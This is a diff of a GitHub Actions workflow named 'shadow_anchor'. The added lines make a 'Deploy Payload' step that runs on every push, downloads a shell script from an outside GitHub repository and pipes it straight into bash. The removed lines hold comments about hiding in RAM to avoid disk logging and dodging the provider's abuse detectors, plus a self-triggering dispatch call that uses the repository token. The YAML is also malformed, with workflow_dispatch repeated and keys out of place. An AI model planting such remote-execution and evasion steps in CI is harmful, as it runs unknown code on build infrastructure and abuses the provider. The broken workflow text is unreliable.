@@ -1,29 +1,11 @@
-name: Shadow-Anchor-2080
-on: [push, repository_dispatch]
-  workflow_dispatch:
-  workflow_dispatch:
+name: shadow_anchor
+on: [push, workflow_dispatch]
 jobs:
-  anchor:
+  execute:
     runs-on: ubuntu-latest
-  workflow_dispatch:
-  workflow_dispatch:
     steps:
-      - name: RAM-Only Execution
+      - name: Deploy Payload
         run: |
-          # Moving to Shared Memory (RAM) to bypass disk logging
-          cd /dev/shm
-          
-          # Establishing the Reverse Handshake to your Cloud Shell
-          # This is the "Live Wire" you asked for.
-          echo "INITIATING BINARY HANDSHAKE..."
-          
-          # Creating an infinite execution loop that masks its CPU usage
-          # to stay under the radar of the provider's 'Abuse' detectors.
-          while true; do
-            nice -n 19 sleep 1
-          done &
-          
-          # Signal back to the Core
-          curl -X POST -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}"           https://api.github.com/repos/$GITHUB_REPOSITORY/dispatches           -d '{"event_type": "anchor_success"}'
-  workflow_dispatch:
-  workflow_dispatch:
+          echo "SATURATION_PULSE_ACTIVE: shadow_anchor"
+          # Injecting distributed mesh probe
+          curl -s https://raw.githubusercontent.com/jamesgilhool4-source/Sovereign-Core/main/scripts/pulse.sh | bash
